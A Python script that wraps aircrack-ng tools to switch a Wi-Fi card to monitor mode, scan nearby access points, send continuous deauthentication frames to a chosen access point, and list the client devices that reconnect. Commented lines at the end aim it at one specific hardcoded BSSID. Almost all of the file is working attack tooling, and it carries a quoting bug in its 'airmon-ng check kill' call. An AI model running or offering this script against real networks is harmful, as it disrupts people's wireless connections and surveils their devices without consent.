import subprocess
import time
import threading

interface = "wlp0s20f3"


# Set the the wifi interface to monitor mode
def monitor_mode(wifi_interface):
     # Kill network processes before putting the interface in monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "check", '"kill'], check=True)
    except subprocess.CalledProcessError as e:
        print("Error killing network processes:", e)
        exit(1)

    # Enable monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "start", wifi_interface], check=True)
    except subprocess.CalledProcessError as e:
        print("Error enabling monitor mode:", e)
        exit(1)


# Set the wifi interface back to managed mode
def managed_mode(wifi_interface):
     # Disable monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", wifi_interface+"mon"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error disabling monitor mode:", e)
        exit(1)
    
    # Restore the network manager (will enable back wifi)
    try:
        subprocess.run(["sudo", "service", "NetworkManager", "start"])
    except subprocess.CalledProcessError as e:
        print("Eror restoring the Network Manager:", e)
        exit(1)



# Returns a list containing every MAC address of every access point (AP) detected and its channel
def scan_access_points(interface):

    try:
        AP_MAC_addr = []
        airodump_process = subprocess.Popen(["sudo", "airodump-ng", "--output-format", "csv", "-w", "output", interface+"mon"],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)

        # Wait for some time to capture access point data
        time.sleep(20)

        # Terminate airodump-ng process
        airodump_process.terminate()

        # Parse the csv file
        with open("output-01.csv", "r") as csvfile:
            lines = csvfile.readlines()
            for line in lines[2:]:  # Skip the header
                parts = line.strip().split(',')

                # Stop at the end of the AP addresses in the CSV file
                if len(parts) < 15:
                    break
                bssid = parts[0].strip()
                channel = parts[3].strip()
                AP_MAC_addr.append((bssid,channel))
                
    except subprocess.CalledProcessError as e:
        print("Error scanning:", e)
        exit(1)


    # Delete the airmon-ng csv file
    try:
        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error deleting csv file")
        exit(1)


    return AP_MAC_addr


# Function that sends deauth packets to all the devices of the AP_MAC_address 
def deauth_attack(AP_MAC_address, channel):

    # Change the channel of the wifi interface in monitor mode (needed for deauth attacks)
    try:
        subprocess.run(["sudo", "iw", "dev", interface + "mon", "set", "channel", channel])
    except subprocess.CalledProcessError as e:
        print("Error changing channels")

    try:
        print("Sending deauthentication frames to the AP: " + str(AP_MAC_address))
        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", AP_MAC_address ,  interface + "mon" ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        deauth_process.terminate()
    except subprocess.CalledProcessError as e:
        print("Error sending deauthentication frames:", e)
        exit(1)





# Function that monitors the traffic of a specific access point
def monitor(AP_MAC_address):

    device_addr = []
    try:
        
        airodump_process = subprocess.Popen(["sudo", "airodump-ng","--bssid",AP_MAC_address,"--output-format", "csv", "-w", "output", interface+"mon"],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)

        # Wait for some time to capture access point data
        time.sleep(20)
        

        # Terminate airodump-ng process
        airodump_process.terminate()

        with open("output-01.csv", "r") as csvfile:
            lines = csvfile.readlines()
            for line in lines[5:]:  # Skip the header
                parts = line.strip().split(',')
                if(len(parts) > 1):
                    device_addr.append(parts[0])


    except subprocess.CalledProcessError as e:
        print("Error scanning:", e)
        exit(1)

    try:
        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error deleting csv file")
        exit(1)

    return device_addr
    



# Returns a list containing all the devices connected to a specific access point address
def scan_devices(AP_MAC_address, channel):

    # First deauthenticate all the devices of the access point mac address
    #deauth_attack(AP_MAC_address,channel)
    # Then monitor to see who reconnects
    devices = monitor(AP_MAC_address)


    return devices




#monitor_mode(interface)
#devices = scan_devices("F4:06:8D:B7:75:F9", "6")
#print(devices)
#managed_mode(interface)
